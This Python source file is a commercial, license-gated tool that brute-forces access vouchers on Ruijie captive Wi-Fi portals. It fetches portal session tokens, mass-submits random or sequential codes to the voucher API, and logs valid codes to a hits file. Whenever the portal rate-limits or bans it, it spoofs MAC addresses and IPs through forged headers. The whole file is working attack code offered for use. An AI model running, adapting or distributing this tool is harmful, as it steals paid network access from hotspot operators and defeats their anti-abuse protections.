# =====================================================================
# kavin_v6.py - KAVIN FAST SPEED V6 (FINAL)
# Part 1 of 2
# Official Ruijie API + Auto-Detect + Fresh Start per Run
# =====================================================================

import os
import time
import random
import string
import re
import html
import json
import asyncio
import aiohttp
import urllib3
import sys
import socket
import threading
import requests
from urllib.parse import urlparse, parse_qs, quote
from rich.console import Console
from rich.text import Text
from rich.prompt import Prompt
from rich.live import Live
from rich.panel import Panel
from rich.box import ROUNDED
from rich.layout import Layout
from rich.table import Table
from rich.align import Align

# ---------- License ----------
try:
    import license as _license
    HAS_LICENSE_MODULE = True
except ImportError:
    HAS_LICENSE_MODULE = False
    _license = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HITS_FILE = "hits.txt"

# ---------- Speed / Safety ----------
CONCURRENCY_LIMIT = 10
RATE_LIMIT_SLEEP = 0.2
NETWORK_RETRY_SLEEP = 0.3
SESSION_REFRESH_SLEEP = 0.4

# ---------- Ruijie Official API ----------
RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
RUIJIE_WIFIDOG = f"{RUIJIE_BASE}/api/auth/wifidog"
RUIJIE_VOUCHER = f"{RUIJIE_BASE}/api/auth/voucher/?lang=en_US"

console = Console()

# ⭐ တစ် run အတွင်းသာ — run အသစ်မှာ ဗလာပြန်
tried_codes = set()
code_lock = threading.Lock()

LICENSE_INFO = {"status": ""}

VENDOR_PREFIXES = [
    [0x00, 0x1A, 0x2B], [0x00, 0x50, 0x56], [0x00, 0x0C, 0x29],
    [0x64, 0x66, 0xB3], [0xCC, 0x2D, 0xE0], [0x54, 0x60, 0x09],
    [0x28, 0xFF, 0x82], [0x70, 0x3A, 0x0E], [0xAC, 0xDE, 0x48],
    [0x10, 0x4F, 0xA8], [0x38, 0xBC, 0x1A], [0x74, 0xDA, 0xDA],
    [0x00, 0x16, 0x3E], [0x00, 0x74, 0x9C], [0xE0, 0x3F, 0x49],
]

def generate_random_mac():
    prefix = random.choice(VENDOR_PREFIXES)
    mac = list(prefix) + [random.randint(0x00, 0xff) for _ in range(3)]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def generate_random_ip():
    return f"192.168.110.{random.randint(2, 254)}"

def clear_screen():
    try: os.system('cls' if os.name == 'nt' else 'clear')
    except Exception: pass

def format_time(seconds):
    try:
        seconds = int(seconds)
        h = seconds // 3600
        m = (seconds % 3600) // 60
        s = seconds % 60
        return f"{h:02d}:{m:02d}:{s:02d}"
    except Exception: return "00:00:00"


# ============================================================
#  LICENSE
# ============================================================

def check_license():
    if HAS_LICENSE_MODULE:
        try:
            return _license.check_approval()
        except Exception:
            pass
    return False, "No license module"

def activate_license(key):
    if HAS_LICENSE_MODULE:
        try:
            return _license.activate(key)
        except Exception as e:
            return False, f"Error: {e}"
    return False, "No license module"


# ============================================================
#  AUTO-DETECT PORTAL URL
# ============================================================

def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split('.')
        parts[-1] = '1'
        return '.'.join(parts)
    except:
        return "192.168.110.1"

def extract_params_from_url(url):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    params = {}
    mapping = {
        'gw_id': 'gw_id', 'gw_sn': 'gw_sn', 'gw_address': 'gw_address',
        'gw_port': 'gw_port', 'ip': 'ip', 'mac': 'mac', 'slot_num': 'slot_num',
        'nasip': 'nasip', 'ssid': 'ssid', 'url': 'url',
        'chap_id': 'chap_id', 'chap_challenge': 'chap_challenge'
    }
    for key, mk in mapping.items():
        if key in query:
            params[mk] = query[key][0]
    if 'RES' in query:
        params['RES'] = query['RES'][0]
    return params

def auto_detect_portal():
    console.print(Panel(
        Align.center(Text("AUTO DETECTING PORTAL URL...", style="bold cyan")),
        border_style="cyan", box=ROUNDED
    ))

    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'})

    TEST_URL = "http://connectivitycheck.gstatic.com/generate_204"
    try:
        r = session.get(TEST_URL, allow_redirects=True, timeout=5)
        if "ruijienetworks" in r.url:
            console.print("[bold green][+][/bold green] Detected via Connectivity Check!")
            return r.url
    except Exception:
        pass

    console.print("[yellow][*][/yellow] Checking Gateways...")
    gateways = [get_gateway_ip(), "192.168.110.1", "192.168.0.1",
                "10.44.77.254", "192.168.1.1"]
    gateways = list(dict.fromkeys(gateways))

    for gw in gateways:
        try:
            res = session.get(f"http://{gw}", timeout=5, allow_redirects=True)
            if "ruijienetworks" in res.url:
                console.print(f"[bold green][+][/bold green] Detected via Gateway ({gw})!")
                return res.url
        except Exception:
            pass

    return None


# ============================================================
#  OFFICIAL SESSION
# ============================================================

async def fetch_official_session(session, gw_params, mac, ip):
    temp_params = dict(gw_params)
    temp_params['mac'] = mac
    temp_params['ip'] = ip

    base = RUIJIE_WIFIDOG
    if "portal-mm-as" in str(gw_params.get("url", "")):
        base = base.replace("portal-as", "portal-mm-as")

    params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
    full_url = f"{base}?{params_str}"

    headers = {
        'User-Agent': f'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Dragon-{mac}',
        'Client-Mac': mac,
        'X-Forwarded-For': ip,
        'Connection': 'close'
    }

    try:
        session.cookie_jar.clear()
        async with session.get(full_url, headers=headers, timeout=8,
                               allow_redirects=False, ssl=False) as resp:
            location = resp.headers.get('Location', '')
            if not location:
                return None

            loc_lower = location.lower()
            if ("request limited" in loc_lower or "error.html" in loc_lower
                or "errormsg" in loc_lower or "banned" in loc_lower):
                return "BAN"

            q = parse_qs(urlparse(location).query)
            sid = q.get('sessionId', [None])[0]
            if sid:
                return {
                    'sessionId': sid,
                    'sign': q.get('sign', [None])[0],
                    'timestamp': q.get('timestamp', [None])[0],
                }
    except asyncio.TimeoutError:
        return "TIMEOUT"
    except aiohttp.ClientError:
        return "NETERR"
    except Exception:
        pass
    return None


async def test_code_official(session, sess_data, code, mac, ip):
    url = RUIJIE_VOUCHER
    if sess_data.get('sign') and sess_data.get('timestamp'):
        url += f"&sign={sess_data['sign']}&timestamp={sess_data['timestamp']}"

    headers = {
        "content-type": "application/json",
        "user-agent": f"Mozilla/5.0 (Linux; Android 12) KavinV6-{mac}",
        "referer": f"{RUIJIE_BASE}/download/static/maccauth/src/index.html?sessionId={sess_data['sessionId']}",
        "Client-Mac": mac,
        "X-Forwarded-For": ip,
    }

    payload = {
        "accessCode": code,
        "sessionId": sess_data['sessionId'],
        "apiVersion": 1,
    }
    if sess_data.get('sign'):      payload["sign"] = sess_data['sign']
    if sess_data.get('timestamp'): payload["timestamp"] = sess_data['timestamp']

    try:
        async with session.post(url, json=payload, headers=headers,
                                timeout=6, ssl=False, allow_redirects=True) as r:
            if r.status == 429:
                return "__RATE_LIMITED__", "1HR"

            text = await r.text()
            if not text:
                return "__NETWORK_ERROR__", "1HR"

            final_url = str(r.url).lower()
            low = text.lower()
            if ("request%20limited" in final_url or "request limited" in final_url
                or "request limited" in low or "too many" in low):
                return "__RATE_LIMITED__", "1HR"

            plan = "1HR"
            if "2hr" in low or "2 hour" in low:           plan = "2HR"
            elif "12hr" in low or "12 hour" in low:       plan = "12HR"
            elif "24hr" in low or "1day" in low or "24 hour" in low: plan = "24HR"

            return text, plan

    except asyncio.TimeoutError:
        return "__TIMEOUT__", "1HR"
    except aiohttp.ClientError:
        return "__NETWORK_ERROR__", "1HR"
    except Exception as e:
        return f"__ERROR__:{type(e).__name__}", "1HR"


# ============================================================
#  CODE GENERATOR
# ============================================================

seq_counter = 0
seq_lock = threading.Lock()

def gen_code(mode, length, scan_method="random"):
    global seq_counter
    try:
        if scan_method == "sequential":
            with seq_lock:
                seq_counter += 1
                current = seq_counter

            if mode == "num":
                return str(current).zfill(length)
            elif mode == "eng":
                s, n = "", current
                for _ in range(length):
                    s = chr(ord('a') + (n % 26)) + s
                    n //= 26
                return s
            elif mode == "mix":
                chars = string.ascii_lowercase + string.digits
                s, n = "", current
                for _ in range(length):
                    s = chars[n % 36] + s
                    n //= 36
                return s
        else:
            if mode == "num":
                return str(random.randint(0, 10**length - 1)).zfill(length)
            elif mode == "eng":
                return ''.join(random.choices(string.ascii_lowercase, k=length))
            elif mode == "mix":
                return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    except Exception:
        pass
    return ""
# =====================================================================
# kavin_v6.py - KAVIN FAST SPEED V6 (FINAL)
# Part 2 of 2
# =====================================================================

# ============================================================
#  DASHBOARD
# ============================================================

def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed,
                             status, hits, speed, cur_mac, cur_ip, tried_count):
    layout = Layout()
    header_text = Text("⚡ KAVIN FAST SPEED V6 ⚡", style="bold bright_cyan", justify="center")
    sub_text = Text(f"Official Ruijie API • {scan_method.upper()} • @kavin799",
                    style="bold bright_green", justify="center")
    layout.split_column(
        Layout(Panel(Align.center(Text.assemble(header_text, "\n", sub_text)),
                     border_style="cyan", box=ROUNDED), size=4),
        Layout(name="body", ratio=1)
    )

    stats = Table.grid(expand=True, padding=(0, 1))
    stats.add_column(style="bold white", justify="left")
    stats.add_column(style="bold cyan", justify="left")
    stats.add_column(style="bold white", justify="left")
    stats.add_column(style="bold green", justify="left")

    stats.add_row("  📅 Expiry", f": {LICENSE_INFO['status']}", "  ⏱ Timer", f": {elapsed}")
    stats.add_row("  🎯 Mode",   f": {mode.upper()}",           "  📊 Tested", f": {tested:,}")
    stats.add_row("  ⚡ Speed",  f": {int(speed)} c/m",         "  📡 Status", f": {status.upper()}")
    stats.add_row("  🔑 Hits",   f": {len(hits)}",               "  📌 Engine", f": {scan_method.upper()}")
    stats.add_row("  🖥  MAC",    f": ...{cur_mac[-8:]}",         "  🌐 IP",     f": ...{cur_ip[-3:]}")
    stats.add_row("  💾 This Run", f": {tried_count:,}",         "  ",          "")

    stats_panel = Panel(stats, border_style="magenta", box=ROUNDED)
    check_panel = Panel(
        Align.center(Text(f"Check Code  :  {current_code if current_code else '------'}",
                          style="bold yellow")),
        border_style="yellow", box=ROUNDED, height=3
    )

    v_table = Table(show_header=True, header_style="bold bright_white",
                    expand=True, box=ROUNDED, border_style="green")
    v_table.add_column("Voucher Hits", style="bold green", justify="center")
    v_table.add_column("Plan", style="bold green", justify="center")
    v_table.add_column("Remaining", style="bold green", justify="center")

    for h in hits[-10:]:
        code_str = h.get('code', '') if isinstance(h, dict) else h
        plan_str = h.get('plan', '1HR') if isinstance(h, dict) else '1HR'
        v_table.add_row(code_str, plan_str, "Active")

    if not hits:
        v_table.add_row("[dim]KAVIN FAST SPEED V6 • Fresh Start per Run[/dim]", "", "")

    footer_text = Text.assemble(("✨ Thank You For Choosing @kavin799 Tools ✨",
                                 "bold bright_yellow"))
    footer_panel = Panel(Align.center(footer_text), border_style="red", box=ROUNDED, height=3)

    body_layout = Layout()
    body_layout.split_column(
        Layout(stats_panel, size=8),
        Layout(check_panel, size=3),
        Layout(v_table, ratio=1),
        Layout(footer_panel, size=3)
    )
    layout["body"].update(body_layout)
    return layout


# ============================================================
#  SCAN LOOP
# ============================================================

async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
    global seq_counter, tried_codes

    # ⭐ အမြဲ ဗလာ — run အသစ်မှာ အစကနေ
    tried_codes = set()
    seq_counter = 0

    if not gw_params:
        gw_params = {
            "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
            "gw_address": "192.168.7.1", "gw_port": "2060", "ip": "192.168.110.2",
            "mac": "", "slot_num": "14", "nasip": "192.168.1.193",
            "ssid": "VLAN7", "ustate": "0", "mac_req": "1",
            "url": "http://connectivitycheck.gstatic.com/generate_204",
            "chap_id": r"\245",
            "chap_challenge": r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067"
        }

    mode_str = f"{mode}_{length}"
    hits = []
    tested = 0
    start_time = time.time()
    current_code = [""]
    current_status = ["Init"]

    current_mac = generate_random_mac()
    current_ip  = generate_random_ip()
    sess_data   = [None]

    conn_limit = aiohttp.TCPConnector(limit=50, ssl=False)
    async with aiohttp.ClientSession(connector=conn_limit) as session:

        live = Live(
            get_dashboard_renderable(mode_str, scan_method, "", tested, "00:00:00",
                                     "Init", hits, 0.0, current_mac, current_ip, 0),
            refresh_per_second=4, screen=False
        )

        with live:
            try:
                while True:
                    if sess_data[0] is None:
                        current_status[0] = "Session"
                        res = await fetch_official_session(
                            session, gw_params, current_mac, current_ip
                        )

                        if res == "BAN":
                            current_status[0] = "Banned → Spoof"
                            current_mac = generate_random_mac()
                            current_ip  = generate_random_ip()
                            live.update(get_dashboard_renderable(
                                mode_str, scan_method, current_code[0], tested,
                                format_time(time.time() - start_time),
                                current_status[0], hits,
                                (tested / max(1, time.time() - start_time) * 60),
                                current_mac, current_ip, len(tried_codes)
                            ))
                            await asyncio.sleep(RATE_LIMIT_SLEEP)
                            continue

                        if res in ("TIMEOUT", "NETERR") or not res:
                            current_status[0] = "Retry"
                            current_mac = generate_random_mac()
                            current_ip  = generate_random_ip()
                            await asyncio.sleep(SESSION_REFRESH_SLEEP)
                            continue

                        sess_data[0] = res
                        current_status[0] = "Active"

                    batch_codes = []
                    while len(batch_codes) < CONCURRENCY_LIMIT:
                        c = gen_code(mode, length, scan_method)
                        if c:
                            with code_lock:
                                if c in tried_codes:   # ← ဒီ run အတွင်း ထပ်မစစ်
                                    continue
                                tried_codes.add(c)
                            batch_codes.append(c)
                    if not batch_codes:
                        await asyncio.sleep(0.05); continue

                    tasks = [
                        test_code_official(
                            session, sess_data[0], code, current_mac, current_ip
                        ) for code in batch_codes
                    ]
                    results = await asyncio.gather(*tasks, return_exceptions=True)

                    hit_found_in_batch = False
                    for idx, res_tuple in enumerate(results):
                        tested += 1
                        code = batch_codes[idx]
                        current_code[0] = code

                        if isinstance(res_tuple, Exception):
                            continue

                        res, plan = res_tuple

                        if res == "__RATE_LIMITED__":
                            current_status[0] = "Ban → Spoof"
                            sess_data[0] = None
                            current_mac = generate_random_mac()
                            current_ip  = generate_random_ip()
                            hit_found_in_batch = True
                            break

                        if res in ("__TIMEOUT__", "__NETWORK_ERROR__"):
                            current_status[0] = "NetErr"
                            continue

                        if res.startswith("__ERROR__:"):
                            current_status[0] = "Err"
                            continue

                        low = res.lower()
                        if "request limited" in low or "blocked" in low or "too many" in low:
                            current_status[0] = "Ban → Spoof"
                            sess_data[0] = None
                            current_mac = generate_random_mac()
                            current_ip  = generate_random_ip()
                            hit_found_in_batch = True
                            break

                        is_hit = False
                        try:
                            j = json.loads(res)
                            if j.get("success") is True and isinstance(j.get("result"), dict):
                                if j["result"].get("logonUrl"):
                                    is_hit = True
                        except Exception:
                            if ('"success":true' in low
                                or '"authresult":"1"' in low
                                or "congratulations" in low):
                                is_hit = True

                        if is_hit:
                            now_str = time.strftime("%H:%M:%S")
                            hits.append({"code": code, "time": now_str, "plan": plan})
                            try:
                                with open(HITS_FILE, "a", encoding="utf-8") as f:
                                    f.write(f"[{now_str}] CODE: {code} | PLAN: {plan}\n")
                            except Exception: pass
                            # ⭐ tried_codes ကို ဖိုင်ထဲ မသိမ်း — run အတွင်းသာ
                            current_status[0] = "HIT!"
                            sess_data[0] = None
                            current_mac = generate_random_mac()
                            current_ip  = generate_random_ip()
                            hit_found_in_batch = True
                            break

                        current_status[0] = "Active"

                    elapsed = time.time() - start_time
                    speed = (tested / elapsed * 60) if elapsed > 0 else 0.0
                    live.update(get_dashboard_renderable(
                        mode_str, scan_method, current_code[0], tested,
                        format_time(elapsed), current_status[0], hits, speed,
                        current_mac, current_ip, len(tried_codes)
                    ))

                    if hit_found_in_batch:
                        await asyncio.sleep(0.15)

            except (KeyboardInterrupt, asyncio.CancelledError):
                live.stop()
                console.print("\n[bold yellow]⏹ Interrupted by user[/bold yellow]")
            except Exception as e:
                live.stop()
                console.print(f"\n[bold red]Error: {e}[/bold red]")


# ============================================================
#  UI / MENU
# ============================================================

def show_banner():
    clear_screen()
    console.print()
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print(Text("⚡ KAVIN FAST SPEED V6 ⚡", style="bold bright_white"), justify="center")
    console.print(Text("Official Ruijie API • Fresh Start per Run", style="bold bright_yellow"), justify="center")
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print()

def ask_mode():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🔢  Number Mode")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 🔤  Alphabet Mode")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] 🔀  Mixed Mode")
        console.print("  [bold bright_red]0.[/bold bright_red] ❌  Exit\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice not in ("1", "2", "3"): continue
        return {"1": "num", "2": "eng", "3": "mix"}[choice]

def ask_length(mode):
    while True:
        show_banner()
        console.print("  [bold bright_white]Choose Voucher Length:[/bold bright_white]\n")
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] ⚡ 6 Characters")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] ⚡ 7 Characters")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] ⚡ 8 Characters")
        console.print("  [bold bright_cyan]4.[/bold bright_cyan] ⚡ 9 Characters")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice not in ("1", "2", "3", "4"): continue
        return {"1": 6, "2": 7, "3": 8, "4": 9}[choice]

def ask_scan_method():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🎲  Random Mode (ကျပန်းစနစ်)")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📈  Sequential Mode (အစဉ်လိုက်စနစ်)")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice not in ("1", "2"): continue
        return {"1": "random", "2": "sequential"}[choice]

def run():
    show_banner()
    portal_url = auto_detect_portal()

    gw_params = None
    if portal_url:
        extracted = extract_params_from_url(portal_url)
        console.print(f"[bold green][+][/bold green] URL fetched successfully!")
        console.print(f"[dim]    gw_id={extracted.get('gw_id','?')} | gw_sn={extracted.get('gw_sn','?')}[/dim]")
        time.sleep(1.5)

        gw_params = {
            "stage": "portal",
            "gw_id": extracted.get("gw_id", "c4b25be7d323"),
            "gw_sn": extracted.get("gw_sn", "H1U320P00210A"),
            "gw_address": extracted.get("gw_address", "192.168.7.1"),
            "gw_port": extracted.get("gw_port", "2060"),
            "ip": generate_random_ip(),
            "mac": "",
            "slot_num": extracted.get("slot_num", "14"),
            "nasip": extracted.get("nasip", "192.168.1.193"),
            "ssid": extracted.get("ssid", "VLAN7"),
            "ustate": "0", "mac_req": "1",
            "url": extracted.get("url", "http://connectivitycheck.gstatic.com/generate_204"),
            "chap_id": extracted.get("chap_id", r"\245"),
            "chap_challenge": extracted.get("chap_challenge",
                r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067")
        }
    else:
        console.print("[bold red][-][/bold red] Auto-detect failed.")
        console.print("[yellow][*][/yellow] Using default gateway params.")
        time.sleep(1.5)

    while True:
        mode = ask_mode()
        if mode is None: return
        length = ask_length(mode)
        if length is None: continue
        scan_method = ask_scan_method()
        if scan_method is None: continue

        try:
            asyncio.run(scan_loop_async(mode, length, scan_method=scan_method,
                                        gw_params=gw_params))
        except KeyboardInterrupt:
            pass
        break

def main():
    global LICENSE_INFO
    try:
        is_valid, expiry_msg = check_license()

        while not is_valid:
            clear_screen()
            console.print(Panel(Align.center(Text("⚡ KAVIN FAST SPEED V6 ⚡",
                                                  style="bold bright_magenta")),
                                border_style="bright_magenta"))
            console.print(Panel(Align.center(Text("🔐 Enter License Key to Continue 🔐",
                                                  style="bold yellow")),
                                border_style="yellow"))
            key = Prompt.ask("   [bold bright_green]➜ 📝 Paste Key Here[/bold bright_green]").strip()
            if key:
                ok, msg = activate_license(key)
                console.print(Panel(Align.center(Text(msg, style="bold bright_green" if ok else "bold red")),
                                    border_style="green" if ok else "red"))
                time.sleep(2)
                is_valid, expiry_msg = check_license()
            else:
                time.sleep(1)

        LICENSE_INFO["status"] = expiry_msg
        run()

    except (KeyboardInterrupt, EOFError):
        console.print("\n\n[bold red]Exiting Kavin Scanner V6...[/bold red]\n")
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
    finally:
        try: clear_screen()
        except Exception: pass
        try:
            console.print("\n\n")
            console.print(Text("✨ Thank You • Contact @kavin799 for Key 🙏",
                               style="bold bright_green"), justify="center")
            console.print("\n\n")
            time.sleep(1)
        except Exception: pass

if __name__ == "__main__":
    main()